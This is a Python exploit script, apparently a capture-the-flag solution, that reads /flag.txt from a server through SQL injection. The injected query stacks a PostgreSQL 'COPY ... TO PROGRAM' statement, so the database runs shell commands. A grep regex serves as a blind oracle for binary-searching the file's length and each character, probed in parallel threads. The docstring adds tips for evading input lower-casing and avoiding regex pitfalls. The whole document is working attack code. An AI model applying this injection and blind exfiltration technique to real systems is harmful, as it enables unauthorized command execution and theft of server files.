#!/usr/bin/env python
"""Read /flag.txt one bit at a time.

`grep -qE -f - <path>` takes the regex from the COPY row on stdin and the data from the file,
so nothing has to survive shell quoting, and assembling the pattern with chr() also sidesteps
the app lower-casing the payload.  ERE `^.{n,}$` gives a length oracle; a bracket expression
over a chosen alphabet gives a per-position membership oracle, ~6 probes per character with
the positions searched in parallel.

Two details that bite if you get them wrong: a `-` inside a bracket expression quietly turns
into a range, so it is emitted last; and metacharacters in the already-recovered prefix are
escaped, otherwise a `.` in the flag matches anything and corrupts every later position.
"""
import string
import sys
import threading

import extract as E
from po import chrjoin

PATH = "/flag.txt"
ALPHA = string.digits + string.ascii_lowercase + "_-.!+{} " + string.ascii_uppercase
META = set("[](){}*+?.^$|\\")


def g(pattern, path=PATH):
    return E.ask("MARS'; COPY (SELECT %s) TO PROGRAM 'grep -qE -f - %s'; SELECT 1; -- "
                 % (chrjoin(pattern), path))


def esc(pfx):
    return "".join("\\" + c if c in META else c for c in pfx)


def cls(chars):
    body = "".join(c for c in chars if c != "-")
    return "[" + body + ("-" if "-" in chars else "") + "]"


def readable(path=PATH):
    return g(".", path)


def alen(path=PATH, cap=200):
    lo, hi = 0, cap
    while lo < hi:
        mid = (lo + hi) // 2
        if g("^.{%d,}$" % (mid + 1), path):
            lo = mid + 1
        else:
            hi = mid
    return lo


def char_at(prefix, pos, path=PATH, alphabet=ALPHA):
    lo, hi = 0, len(alphabet) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        if g("^" + esc(prefix) + cls(alphabet[lo:mid + 1]), path):
            hi = mid
        else:
            lo = mid + 1
    return alphabet[lo]


def recover(prefix="sun{", path=PATH, workers=8):
    n = alen(path)
    print("[*] %s is %d bytes" % (path, n), flush=True)
    body = list(prefix)
    i = len(prefix) + 1
    while i <= n:
        chunk = []

        def w(k):
            chunk.append((k, char_at("".join(body[:k - 1]), k, path)))
        ts = [threading.Thread(target=w, args=(k,), daemon=True)
              for k in range(i, min(i + workers, n + 1))]
        for t in ts:
            t.start()
        for t in ts:
            t.join(900)
        for k, c in sorted(chunk):
            while len(body) < k:
                body.append("?")
            body[k - 1] = c
        i += len(ts) or 1
        print("   %-52s (%d probes)" % ("".join(body), E.CALL[0]), flush=True)
    return "".join(body[:n])


if __name__ == "__main__":
    if not readable():
        sys.exit("[-] %s is not readable by the database user" % PATH)
    print("[*] readable; starts with sun{ :", g("^sun\\{"), flush=True)
    v = recover()
    print("[+] flag: %s" % v, flush=True)
    open("flag.txt", "w").write(v.strip() + "\n")
